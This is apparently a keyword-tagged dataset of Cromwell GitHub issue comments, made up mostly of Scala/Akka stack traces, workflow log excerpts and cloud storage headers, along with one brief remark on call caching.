scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472:2656,concurren,concurrent,2656,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472,1,['concurren'],['concurrent']
Performance,108); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.$anonfun$updateStatuses$4(OccasionalStatusPollingActor.scala:103); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.updateForStatusNames$1(OccasionalStatusPollingActor.scala:101); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.cromwell$backend$impl$aws$OccasionalStatusPollingActor$$updateStatuses(OccasionalStatusPollingActor.scala:118); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor$$anonfun$receive$1.$anonfun$applyOrElse$1(OccasionalStatusPollingActor.scala:57); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:659); 	at scala.util.Success.$anonfun$map$1(Try.scala:255); 	at scala.util.Success.map(Try.scala:213); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:292); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:6321,concurren,concurrent,6321,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['concurren'],['concurrent']
Performance,"16-01-31 16:37:29,61] [error] Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0 transitioned to state Failed; java.lang.Throwable: Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0 transitioned to state Failed; at cromwell.engine.workflow.SingleWorkflowRunnerActor$RunnerData.addFailure(SingleWorkflowRunnerActor.scala:41); at cromwell.engine.workflow.SingleWorkflowRunnerActor$$anonfun$2.applyOrElse(SingleWorkflowRunnerActor.scala:99); at cromwell.engine.workflow.SingleWorkflowRunnerActor$$anonfun$2.applyOrElse(SingleWorkflowRunnerActor.scala:77); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:604); at cromwell.engine.workflow.SingleWorkflowRunnerActor.akka$actor$LoggingFSM$$super$processEvent(SingleWorkflowRunnerActor.scala:52); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:734); at cromwell.engine.workflow.SingleWorkflowRunnerActor.processEvent(SingleWorkflowRunnerActor.scala:52); at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:598); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:592); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.SingleWorkflowRunnerActor.aroundReceive(SingleWorkflowRunnerActor.scala:52); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:516); at akka.actor.ActorCell.invoke(ActorCell.scala:487); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:238); at akka.dispatch.Mailbox.run(Mailbox.scala:220); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0 transitioned to state Failed; $; ```. ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:8437,concurren,concurrent,8437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,4,['concurren'],['concurrent']
Performance,"18-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurren",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99274,concurren,concurrent,99274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:2218,cache,cache,2218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance,"1: on google, generating a psURL and calling HEAD on it (which you can also do with a GET and only as for the 1st byte). HTTP/2 200 ; x-guploader-uploadid: AEnB2Uo10d8ECr7tR5601R8roi8MIXlzvg1rjyMui9wavFC7KO2Pv2QBk94Qv22mgAz5Ih0nnayc2kXj5XBFgRUqkNTJNtAo7Q; expires: Fri, 29 Jun 2018 15:56:42 GMT; date: Fri, 29 Jun 2018 15:56:42 GMT; cache-control: private, max-age=0; last-modified: Fri, 29 Jun 2018 15:53:49 GMT; etag: ""09f7e02f1290be211da707a266f153b3""; x-goog-generation: 1530287629024005; x-goog-metageneration: 1; x-goog-stored-content-encoding: identity; x-goog-stored-content-length: 6; content-type: text/plain; content-language: en; x-goog-hash: crc32c=sMnOMw==; x-goog-hash: md5=CffgLxKQviEdpweiZvFTsw==; x-goog-storage-class: STANDARD; accept-ranges: bytes; content-length: 6; server: UploadServer; alt-svc: quic="":443""; ma=2592000; v=""43,42,41,39,35""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401397990:333,cache,cache-control,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401397990,1,['cache'],['cache-control']
Performance,2667. ```; org.scalatest.exceptions.TestFailedDueToTimeoutException: The code passed to eventually never returned normally. Attempted 210 times over 3.3447279390999998 minutes. Last failure message: Submitted did not equal Failed.; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:249,concurren,concurrent,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,3,['concurren'],['concurrent']
Performance,"27] [info] JesAsyncBackendJobExecutionActor [fd2fcb78case_gatk_acnv_workflow.HetPulldown:15:1]: JesAsyncBackendJobExecutionActor [fd2fcb78:case_gatk_acnv_workflow.HetPulldown:15:1] Status change from - to Initializing; [2016-10-27 13:47:24,90] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256645647:2081,concurren,concurrent,2081,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256645647,5,['concurren'],['concurrent']
Performance,"3); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; ```; $ tail -n 10 stderr; Traceback (most recent call last):; File ""/src/Merge_MAFs.py"", line 182, in <module>; main(sys.argv[1:]); File ""/src/Merge_MAFs.py"", line 76, in main; concatenatedMafFilename = _handle_mafs(args); File ""/src/Merge_MAFs.py"", line 83, in _handle_mafs; mafPaths = _getMafPaths(args.mafpaths); File ""/src/Merge_MAFs.py"", line 98, in _getMa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:6544,concurren,concurrent,6544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['concurren'],['concurrent']
Performance,"39); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:4025,concurren,concurrent,4025,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,"3: call caching: in order to make the cache hit, we only need to obtain the MD5 from the input and match it to something run before. If we can get this from the supplied psURL then we have the md5 and can match internally. . As long as we are not using psURLs as destinations (e.g. we are still writing task outputs to the cromwell execution bucket) performing the ""hit"" (e.g. doing the copy/reference) shouldn't be affected by psURLs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401390686:38,cache,cache,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3817#issuecomment-401390686,2,"['cache', 'perform']","['cache', 'performing']"
Performance,"4:37:35,25] [info] watching Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$b#797880880]; [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:5770,concurren,concurrent,5770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"83c42b47; [2018-11-21 15:09:05,54] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-11-21 15:09:05,57] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-11-21 15:09:05,58] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-11-21 15:09:06,80] [info] MaterializeWorkflowDescriptorActor [02306258]: Parsing workflow as WDL draft-2; [2018-11-21 15:09:07,34] [info] MaterializeWorkflowDescriptorActor [02306258]: Call-to-Backend assignments: test.hello -> AWSBATCH; [2018-11-21 15:09:08,72] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Starting test.hello; [2018-11-21 15:09:10,76] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: echo 'Hello World!' > ""helloWorld.txt""; [2018-11-21 15:09:10,80] [info] Submitting job to AWS Batch; [2018-11-21 15:09:10,80] [info] dockerImage: ubuntu:latest; [2018-11-21 15:09:10,80] [info] jobQueueArn: arn:aws:batch:us-east-1:267795504649:job-queue/GenomicsHighPriorityQue-ae4256f76f07d96; [2018-11-21 15:09:10,80] [info] taskId: test.hello-None-1; [2018-11-21 15:09:10,80] [info] hostpath root: test/hello/02306258-436a-4372-ab54-2dcd83c42b47/None/1; [2018-11-21 15:09:14,56] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: job id: 77106e8d-c518-4c0d-82e9-3f23e1f07040; [2018-11-21 15:09:14,62] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from - to Running; [2018-11-21 15:09:37,18] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from Running to Succeeded; [2018-11-21 15:09:39,33] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; }; [2018-11-21 15:09:39,37",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:3200,queue,queue,3200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['queue'],['queue']
Performance,"89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:246); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:144); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:138); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214); at java.nio.file.Files.newByteChannel(Files.java:361); at java.nio.file.Files.newByteChannel(Files.java:407); at java.nio.file.Files.readAllBytes(Files.java:3149); at better.files.File.loadBytes(File.scala:80); at better.files.File.byteArray(File.scala:81); at better.files.File.contentAsString(File.scala:91); at 